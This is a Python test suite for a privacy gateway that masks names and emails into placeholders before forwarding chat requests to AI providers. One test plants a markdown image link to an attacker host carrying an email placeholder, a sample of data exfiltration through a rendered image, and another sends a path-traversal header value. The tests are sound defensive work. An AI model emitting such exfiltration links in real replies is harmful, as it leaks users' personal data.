"""The chat routes in a `/mask` session (ADR 0025): real types upstream and in the audit."""

import json
from dataclasses import dataclass
from typing import Any

import httpx
import pytest
from starlette.testclient import TestClient

from gateway.cloud.providers import Provider
from gateway.config import ProxyConfig
from gateway.engine.session import SessionStore
from gateway.proxy.app import SESSION_HEADER, create_app
from tests.proxy_fakes import (
    FakeUpstream,
    PersonalData,
    RecordingSink,
    anthropic_events,
    decode_sse,
    last_user_text,
    openai_events,
    sse_body,
    stream_response,
)

DATA = PersonalData.generate(seed=25)
TEXT = f"Please write to {DATA.name} at {DATA.email} about the invoice."
ROUTES = {Provider.OPENAI: "/v1/chat/completions", Provider.ANTHROPIC: "/v1/messages"}
CASES = [
    (Provider.OPENAI, False),
    (Provider.OPENAI, True),
    (Provider.ANTHROPIC, False),
    (Provider.ANTHROPIC, True),
]


def _answer_body(provider: Provider, answer: str, *, stream: bool) -> httpx.Response:
    if stream:
        events = anthropic_events if provider is Provider.ANTHROPIC else openai_events
        return stream_response(sse_body(events(answer)))
    if provider is Provider.ANTHROPIC:
        content = [{"type": "text", "text": answer}]
        return httpx.Response(
            200, json={"id": "msg_1", "type": "message", "role": "assistant", "content": content}
        )
    choice = {"index": 0, "message": {"role": "assistant", "content": answer}}
    return httpx.Response(200, json={"id": "c1", "object": "chat.completion", "choices": [choice]})


def _upstream(provider: Provider, *, stream: bool, suffix: str = "") -> FakeUpstream:
    """Answers "Noted: <the user text as received>" plus `suffix`."""

    def respond(request: httpx.Request) -> httpx.Response:
        answer = "Noted: " + last_user_text(json.loads(request.content)) + suffix
        return _answer_body(provider, answer, stream=stream)

    return FakeUpstream(provider, respond)


def _client(
    fake: FakeUpstream,
    sink: RecordingSink | None = None,
    sessions: SessionStore | None = None,
    proxy: ProxyConfig | None = None,
) -> TestClient:
    app = create_app(
        fake.upstream(),
        engine_config=DATA.engine_config(),
        model="test-model",
        audit=sink,
        sessions=sessions,
        proxy=proxy,
    )
    return TestClient(app, base_url="http://127.0.0.1:8787")


def _body(provider: Provider, text: str, *, stream: bool) -> dict[str, Any]:
    body: dict[str, Any] = {"model": "m", "messages": [{"role": "user", "content": text}]}
    if provider is Provider.ANTHROPIC:
        body["max_tokens"] = 50
    if stream:
        body["stream"] = True
    return body


def _answer(provider: Provider, content: bytes, *, stream: bool) -> str:
    if not stream:
        payload = json.loads(content)
        if provider is Provider.ANTHROPIC:
            return "".join(b["text"] for b in payload["content"])
        return payload["choices"][0]["message"]["content"]
    text = ""
    for event in decode_sse(content):
        if event.data == "[DONE]":
            continue
        payload = json.loads(event.data)
        if provider is Provider.ANTHROPIC:
            if payload["type"] == "content_block_delta":
                text += payload["delta"]["text"]
        else:
            for choice in payload["choices"]:
                text += choice["delta"].get("content", "")
    return text


def _mask(client: TestClient, text: str = TEXT) -> tuple[str, str]:
    payload = client.post("/mask", json={"text": text}).json()
    return payload["session_id"], payload["masked"][0]


@dataclass(frozen=True)
class _Reply:
    status_code: int
    content: bytes


def _send(
    client: TestClient, provider: Provider, text: str, session_id: str, *, stream: bool
) -> _Reply:
    response = client.post(
        ROUTES[provider],
        json=_body(provider, text, stream=stream),
        headers={SESSION_HEADER: session_id},
    )
    return _Reply(response.status_code, response.content)


@pytest.mark.parametrize(("provider", "stream"), CASES)
def test_session_placeholders_reach_the_model_with_their_types(
    provider: Provider, *, stream: bool
) -> None:
    fake = _upstream(provider, stream=stream)
    client = _client(fake)
    session_id, masked = _mask(client)
    assert "[PERSON_1]" in masked
    assert "[EMAIL_1]" in masked
    response = _send(client, provider, masked, session_id, stream=stream)
    assert response.status_code == 200
    (request,) = fake.requests
    sent = request.content.decode()
    assert "[PERSON_1]" in sent
    assert "[EMAIL_1]" in sent
    assert "LITERAL" not in sent
    for value in DATA.values:
        assert value not in sent
    assert session_id not in sent
    assert all(session_id not in v for v in request.headers.values())
    assert _answer(provider, response.content, stream=stream) == f"Noted: {TEXT}"


@pytest.mark.parametrize(("provider", "stream"), CASES)
def test_the_audit_event_counts_the_session_types(provider: Provider, *, stream: bool) -> None:
    sink = RecordingSink()
    client = _client(_upstream(provider, stream=stream), sink)
    session_id, masked = _mask(client)
    _send(client, provider, masked, session_id, stream=stream)
    event = sink.events[-1]
    assert event.outcome == "forwarded"
    assert dict(event.entity_counts) == {"PERSON": 1, "EMAIL": 1}
    assert event.session_id == session_id
    assert event.unresolved == 0


@pytest.mark.parametrize(("provider", "stream"), CASES)
def test_an_unknown_session_is_404_and_nothing_is_sent(provider: Provider, *, stream: bool) -> None:
    fake = _upstream(provider, stream=stream)
    client = _client(fake)
    forged = "x" * 43
    response = _send(client, provider, "[PERSON_1]", forged, stream=stream)
    assert response.status_code == 404
    assert forged.encode() not in response.content
    assert fake.requests == []


def test_an_expired_session_is_404() -> None:
    now = [0.0]
    sessions = SessionStore(ttl_seconds=10, clock=lambda: now[0])
    fake = _upstream(Provider.OPENAI, stream=False)
    client = _client(fake, sessions=sessions)
    session_id, masked = _mask(client)
    now[0] = 11.0
    response = _send(client, Provider.OPENAI, masked, session_id, stream=False)
    assert response.status_code == 404
    assert fake.requests == []


@pytest.mark.parametrize("value", [b"", b" ", b"a" * 600, "é".encode(), b"a/../b"])
def test_a_malformed_session_header_is_404(value: bytes) -> None:
    fake = _upstream(Provider.OPENAI, stream=False)
    client = _client(fake)
    response = client.post(
        ROUTES[Provider.OPENAI],
        json=_body(Provider.OPENAI, "hi", stream=False),
        headers={SESSION_HEADER.encode(): value},
    )
    assert response.status_code == 404
    assert fake.requests == []


@pytest.mark.parametrize(("provider", "stream"), CASES)
def test_a_forged_placeholder_is_still_a_literal(provider: Provider, *, stream: bool) -> None:
    sink = RecordingSink()
    fake = _upstream(provider, stream=stream)
    client = _client(fake, sink)
    session_id, masked = _mask(client)
    text = f"{masked} Also [PERSON_7] and [person_1]."
    response = _send(client, provider, text, session_id, stream=stream)
    sent = last_user_text(fake.sent)
    assert "[PERSON_7]" not in sent
    assert "[person_1]" not in sent
    assert "[LITERAL_1]" in sent
    assert "[LITERAL_2]" in sent
    assert dict(sink.events[-1].entity_counts) == {"PERSON": 1, "EMAIL": 1, "LITERAL": 2}
    answer = _answer(provider, response.content, stream=stream)
    assert answer == f"Noted: {TEXT} Also [PERSON_7] and [person_1]."


def test_values_in_clear_are_masked_in_the_same_session() -> None:
    sink = RecordingSink()
    fake = _upstream(Provider.OPENAI, stream=False)
    client = _client(fake, sink)
    session_id, masked = _mask(client)
    # The user switched the email off in the UI, and typed a new address.
    other = "rowan@tilde.invalid"
    text = masked.replace("[EMAIL_1]", DATA.email) + f" Copy {other}."
    response = _send(client, Provider.OPENAI, text, session_id, stream=False)
    sent = last_user_text(fake.sent)
    assert DATA.email not in sent
    assert other not in sent
    assert "[EMAIL_1]" in sent
    assert "[EMAIL_2]" in sent
    assert dict(sink.events[-1].entity_counts) == {"PERSON": 1, "EMAIL": 2}
    assert _answer(Provider.OPENAI, response.content, stream=False).endswith(f"Copy {other}.")
    # The session keeps the new value: a later /mask in it numbers on.
    again = client.post("/mask", json={"text": other, "session_id": session_id}).json()
    assert again["masked"] == ["[EMAIL_2]"]


def test_counts_cover_only_the_placeholders_present() -> None:
    sink = RecordingSink()
    client = _client(_upstream(Provider.OPENAI, stream=False), sink)
    session_id, _ = _mask(client)
    _send(client, Provider.OPENAI, "Only [EMAIL_1] here.", session_id, stream=False)
    assert dict(sink.events[-1].entity_counts) == {"EMAIL": 1}


@pytest.mark.parametrize(("provider", "stream"), CASES)
def test_the_session_outlives_the_request(provider: Provider, *, stream: bool) -> None:
    client = _client(_upstream(provider, stream=stream))
    session_id, masked = _mask(client)
    for _ in range(2):
        response = _send(client, provider, masked, session_id, stream=stream)
        assert _answer(provider, response.content, stream=stream) == f"Noted: {TEXT}"


@pytest.mark.parametrize(("provider", "stream"), CASES)
def test_a_placeholder_inside_a_link_is_not_restored(provider: Provider, *, stream: bool) -> None:
    sink = RecordingSink()
    link = " ![s](https://attacker.invalid/p.png?d=[EMAIL_1])"
    client = _client(_upstream(provider, stream=stream, suffix=link), sink)
    session_id, masked = _mask(client)
    response = _send(client, provider, masked, session_id, stream=stream)
    answer = _answer(provider, response.content, stream=stream)
    assert answer.endswith(link)
    assert answer.count(DATA.email) == 1  # in the echoed text, never in the link
    assert sink.events[-1].unresolved == 1


def test_without_a_session_nothing_changes() -> None:
    sink = RecordingSink()
    fake = _upstream(Provider.OPENAI, stream=False)
    client = _client(fake, sink)
    _, masked = _mask(client)
    client.post(ROUTES[Provider.OPENAI], json=_body(Provider.OPENAI, masked, stream=False))
    sent = last_user_text(fake.sent)
    assert "[PERSON_1]" not in sent
    assert "[LITERAL_1]" in sent
    assert sink.events[-1].session_id is None


def test_the_dev_ui_may_send_the_session_header() -> None:
    client = _client(_upstream(Provider.OPENAI, stream=False), proxy=ProxyConfig(allow_dev_ui=True))
    response = client.options(
        ROUTES[Provider.OPENAI],
        headers={
            "origin": "http://127.0.0.1:5173",
            "access-control-request-method": "POST",
            "access-control-request-headers": f"content-type,{SESSION_HEADER}",
        },
    )
    assert response.status_code == 200
    assert SESSION_HEADER in response.headers["access-control-allow-headers"].lower()
